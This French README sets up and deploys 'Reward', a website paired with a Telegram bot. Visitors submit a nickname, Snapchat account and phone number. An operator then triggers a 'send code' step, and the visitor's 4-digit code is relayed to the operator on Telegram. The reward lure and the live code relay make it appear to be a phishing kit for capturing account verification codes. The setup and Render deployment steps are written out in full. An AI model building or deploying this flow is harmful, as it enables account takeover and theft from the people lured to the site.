# Reward — Site web + Bot Telegram (adapté de `mazamazamzamza/reward`)

Ce projet garde l'interface **site web** pour l'utilisateur, et utilise **Telegram** pour les notifications et la validation par l'admin.

## Flux

1. L'utilisateur vient sur le site et remplit le formulaire : pseudo, compte Snapchat, numéro de téléphone.
2. La demande est envoyée au serveur, qui l'affiche à l'admin sur **Telegram** avec des boutons inline :
   - ✅ Accepter
   - ❌ Refuser
   - 📱 Envoyer le code
   - 🚫 Bloquer
3. L'admin clique sur un bouton depuis Telegram. Le statut se met à jour et les boutons disparaissent du message.
4. Quand le code est déclenché, l'utilisateur saisit ses **4 chiffres** sur la page `code.html`.
5. L'admin reçoit le code saisi directement sur **Telegram**.

## Fichiers

```
code/
├── server.py          # Serveur HTTP (site web) + polling Telegram (bot)
├── index.html         # Page d'accueil + formulaire de demande
├── code.html          # Page de saisie du code a 4 chiffres
├── admin.html         # Panel admin web (optionnel, les actions se font surtout sur Telegram)
├── css/main.css       # Styles
├── js/config.js       # Configuration API
├── js/api.js          # Appels API
├── js/app.js          # Logique formulaire
├── js/code.js         # Logique page code
├── js/admin.js        # Logique panel admin web
├── data.json          # Base de donnees locale (generee automatiquement)
├── requirements.txt   # Aucune dependance externe (stdlib uniquement)
└── README.md
```

## Prérequis

- Python 3 installé
- Un bot Telegram (créé via [@BotFather](https://t.me/botfather)) avec son token

## Installation et lancement

```powershell
# Se placer dans le dossier
cd "C:\Users\jteez\OneDrive\Bureau\code"

# Variables d'environnement (PowerShell)
$env:TELEGRAM_BOT_TOKEN="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
$env:TELEGRAM_ADMIN_CHAT_ID="987654321"

# Lancer le serveur
python server.py
```

Le site est accessible sur `http://localhost:3000` (ou le port défini par `PORT`).

## Variables d'environnement

| Variable | Obligatoire | Description |
|----------|-------------|-------------|
| `TELEGRAM_BOT_TOKEN` | Oui | Token du bot (donné par @BotFather) |
| `TELEGRAM_ADMIN_CHAT_ID` | Oui | ID du chat admin (ou plusieurs séparés par des virgules) |
| `PORT` | Non | Port du serveur web (défaut: 3000) |

### Trouver votre ID de chat admin

1. Démarrez une conversation avec votre bot sur Telegram.
2. Tapez `/id` dans le chat.
3. Le bot répond avec votre ID de chat.
4. Renseignez cet ID dans `TELEGRAM_ADMIN_CHAT_ID`.

## Commandes Telegram (envoyées au bot)

| Commande | Effet |
|----------|-------|
| `/start` | Aide / bienvenue |
| `/id` | Affiche votre ID de chat |

## Données

Toutes les demandes et l'historique sont sauvegardées dans `data.json` (créé automatiquement au premier lancement).

## Déploiement Render

Le serveur répond sur le port `PORT` pour le health-check. Définissez les variables d'environnement `TELEGRAM_BOT_TOKEN` et `TELEGRAM_ADMIN_CHAT_ID` dans le dashboard Render.
